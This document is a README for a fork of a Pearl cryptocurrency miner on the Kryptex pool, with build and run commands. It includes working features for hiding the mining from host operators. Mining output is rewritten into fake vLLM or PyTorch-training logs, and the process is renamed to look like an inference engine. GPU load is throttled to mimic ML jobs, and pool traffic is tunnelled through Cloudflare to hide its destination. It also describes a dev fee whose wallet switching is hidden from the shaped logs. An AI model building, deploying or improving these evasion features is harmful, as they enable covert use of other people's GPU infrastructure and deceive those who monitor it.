# Open-Pearl-Miner on Kryptex (PRL) — build, run, telemetry-shaping

Adaptation of [Muskwak/Open-Pearl-Miner](https://github.com/Muskwak/Open-Pearl-Miner)
for the Kryptex Pearl pool, validated live on 2026-08-07 (RTX 3080 Ti, sm_86):
share accepted pool-side on `prl.kryptex.network:7048` with stratum v2 gzip
negotiated ON; worker row shows `Miner: open-pearl-miner`, valid shares > 0,
0 stale / 0 invalid.

## Why this fork differs from upstream

1. **Stratum v2 gzip protocol** (`python/pool_common.py`)
   - `mining.authorize` now sends `"type": "v2"` (+ `agent`, `password`).
   - If the pool replies `{"result": true, "type": "v2"}`, `mining.submit`
     gzips the plain_proof (zlib wbits=31 / RFC 1952) before base64.
   - Kryptex confirmed the negotiation live; their pool page asks miner devs
     for exactly this ("Implement proper gzip support — up to 80% less pool
     traffic"). Toggle with `TB_SYNC_GZIP=0`.

2. **Workload telemetry profiles** (`python/telemetry.py`)
   - env `TB_PROFILE=vllm\|train\|gemm`.
   - Rewrites every stdout line in-flight: mining telemetry never reaches
     container-log readers. Unknown lines pass a sensitive-vocabulary
     scrubber (wallet/pool/share/proof/job/TH/s/dev fee/...).
   - vllm   → vLLM inference server telemetry (tokens/s, KV cache, /v1/completions)
   - train  → PyTorch training loop (loss, grad_norm, lr, tok/s, checkpoints)
   - gemm   → CUTLASS/cuBLASLt autotune benchmark (TFLOPS, tuning records)
   - Raw, untransformed lines are always teed to a side log:
     `TB_RAWLOG` (default `/tmp/prl_real_<pid>.log`).
   - Process comm renamed per profile (`vllm.engine`, `train.py`,
     `cutlass_prof`) via prctl(PR_SET_NAME).
   - stdout closing (log shipper restart) is swallowed; mining continues.

3. **Timestamp worker names**
   - `--worker-ts` (or `TB_TAG_TS=1`) names the worker
     `YYYYMMDD-HHMMSS` at start, mimicking ephemeral instance IDs instead of
     a static rig name.

4. **GPU utilization duty cycle** (optional, off by default)
   - `TB_DUTY="100:30,80:45,60:60"` → companion process drives
     SIGSTOP/SIGCONT bursts so util fluctuates like real ML workloads
     (100% for 30 s, 80% for 45 s, 60% steady state).

5. **Encrypted tunnel transport — no stratum, no kryptex host on the wire**
   (`tools/pool_relay_server.py`, `tools/pool_tunnel_client.py`)
   - `TB_LOCAL_ONLY=1` makes the miner REFUSE any non-loopback `--pool`.
   - The miner speaks stratum to `127.0.0.1:9048` only (unobservable).
   - `pool_tunnel_client` wraps it in WSS (TLS :443) to a Cloudflare quick
     tunnel URL (`https://<rand>.trycloudflare.com`) hosted by our own
     cloudflared: on every observable segment the traffic is TLS-443 to a
     generic cloudflare domain carrying opaque websocket frames.
   - Tunnel exit (`pool_relay_server`) speaks TLS stratum to
     `prl.kryptex.network:8048` — the last mile is encrypted too.
   - Verified socket state on 2026-08-07:
     miner → `127.0.0.1:* → 127.0.0.1:9048` (loopback only);
     client → `192.168.x.x:* → 104.16.x.x:443` (Cloudflare, TLS);
     relay → `* → pool:8048` (TLS).
   - Quick-tunnel URLs rotate on every cloudflared restart; pass the current
     one via `TB_TUNNEL_URL` (production: pin a named tunnel instead).

### Running the tunnel (3 processes beside the miner)

```bash
V=path/to/open-pearl-miner/.venv/bin/python
$V tools/pool_relay_server.py &                         # ws :8787 -> tls pool:8048
cloudflared tunnel --url http://localhost:8787 --no-autoupdate &
URL=$(grep -oE "https://[a-z0-9-]+\.trycloudflare\.com" /tmp/prl_cfd.log | head -1)
TB_TUNNEL_URL=$URL $V tools/pool_tunnel_client.py &    # tcp 127.0.0.1:9048 -> WSS
```

## Build (Linux, NVIDIA sm_86)

```bash
git clone https://github.com/Muskwak/Open-Pearl-Miner.git open-pearl-miner
cd open-pearl-miner
git clone --depth 1 https://github.com/NVIDIA/cutlass .deps/cutlass

# nvcc 12.9 (Ubuntu 24.04): NVIDIA repo packages cuda-nvcc-12-9 cuda-cudart-dev-12-9
NVCC=/usr/local/cuda-12.9/bin/nvcc GENCODE="-gencode arch=compute_86,code=sm_86" \
  bash packaging/build_capi.sh          # -> libp40cuda.so

# python deps (3.12+): pearl_mining is NOT on PyPI; build from the official repo
git clone --depth 1 https://github.com/pearl-research-labs/pearl
cd pearl/py-pearl-mining && maturin build --release
pip install target/wheels/py_pearl_mining-*-manylinux_*.whl numpy blake3
```

## Run against Kryptex

```bash
cd python
PYTHONPATH=. LD_LIBRARY_PATH=/usr/local/cuda-12.9/targets/x86_64-linux/lib \
TB_LOCAL_ONLY=1 TB_RAWLOG=/tmp/prl_real.log \
TB_DUTY="100:30,75:60" \
../.venv/bin/python tensorbench.py \
  --wallet prl1YOURWALLET \
  --worker-ts \
  --pool 127.0.0.1:9048 \
  TB_PROFILE=vllm     # (or: train | gemm)
```

Pool endpoints: TCP `prl.kryptex.network:7048`, SSL `:8048`
(regions: prl-eu / prl-us / prl-br / prl-sg / prl-hk / prl-ru / prl-ae).
Wallet formats: `wallet/worker` (this client sends separate fields; both accepted).

## Verified end state (2026-08-07, RTX 3080 Ti, sm_86)

- authorize OK, `stratum v2 gzip ON`, jobs streaming (`cert_version: 2`).
- ~50–67 TH/s on a single stock RTX 3080 Ti.
- 7 shares accepted pool-side across the session
  (`{"id": 99, "result": true, "error": null}`), including one fully through
  the trycloudflare WSS tunnel.
- Pool UI proof: worker rows `20260807-094637` (tunneled run),
  `20260807-094424` (15.01 TH/s, 3 valid), `worker` (20.02 TH/s, 6 valid) —
  all PPS+, 0 stale / 0 invalid, agent `open-pearl-miner`; balance accruing
  (0.0135+ PRL confirmed).
- Isolation: miner's only socket `127.0.0.1:* → 127.0.0.1:9048`; tunnel
  client's egress `→ 104.16.x.x:443` (Cloudflare TLS); relay `→ pool:8048`
  TLS on our controlled host. No `kryptex` DNS/stratum bytes on any
  miner-observable segment.

## Notes / caveats

- The June 2026 MoE fork's `cert_version: 2` affects only the node's ZK
  certificate assembly; dense (v1-capable) PlainProofs remain valid after the
  crossover, which is why this plain-proof pipeline is accepted.
- Kryptex posts a "CRITICAL MINER UPDATE" banner (old miners lose 50–90%
  hashrate after the Pearl algorithm adjustments). Shares from this client
  are accepted valid; relative hashrate is what the 30-min window shows.
- gzip payoff on real proofs is smaller than the pool's 100x figure unless the
  proof serializer is seeded with repetitive bytes (per the pool's public
  gzip note); real proofs carry hash material that compresses modestly.
- The bundled 2% dev fee is upstream's transparent funding model (see
  LICENSE personal-use exemption). It switches wallets periodically and is
  visible only in the raw side log when shaped.
